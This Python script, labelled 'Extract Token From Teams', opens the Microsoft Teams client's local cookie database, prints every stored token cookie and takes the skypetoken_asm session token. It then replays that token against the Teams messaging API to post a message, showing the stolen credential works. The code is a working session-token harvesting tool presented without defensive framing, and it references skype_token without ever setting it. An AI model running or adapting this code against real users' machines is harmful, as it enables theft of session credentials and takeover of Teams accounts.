import os
import sqlite3
import requests

print("Starting Extract Token From Teams")

AppDataPath=os.getenv('AppData')
Cookie_db_path="{0}\Microsoft\Teams\Cookies".format(AppDataPath)
#leveldb_path="{0}\Microsoft\Teams\Local Storage\leveldb".format(AppDataPath)

conn = sqlite3.connect(Cookie_db_path)
print ("Opened database successfully")
cursor = conn.execute("SELECT host_key, name, value from cookies")


for row in cursor:
    if "skypetoken_asm" in row[1] and row[0] == ".teams.microsoft.com" :
        skype_token=row[2]
    if "token" in row[1]:
        print ("Host Key = ", row[0])
        print ("Name = ", row[1])
        print ("Value = ", row[2], "\n")

if skype_token:
    headers = {"Authentication":"skypetoken={0}".format(skype_token)}
    data = {"content":"{0}".format(skype_token),
    "messagetype":"RichText/Html",
    "contenttype":"text"}

    req= requests.post("https://emea.ng.msg.teams.microsoft.com/v1/users/ME/conversations/48:notes/messages", headers=headers, json=data)
    if req.status_code == 201:
        print("Message successfully sent on Teams!")
    else:
        print(req.json())
else:
    print("Unable to retrieve skype token")


conn.close()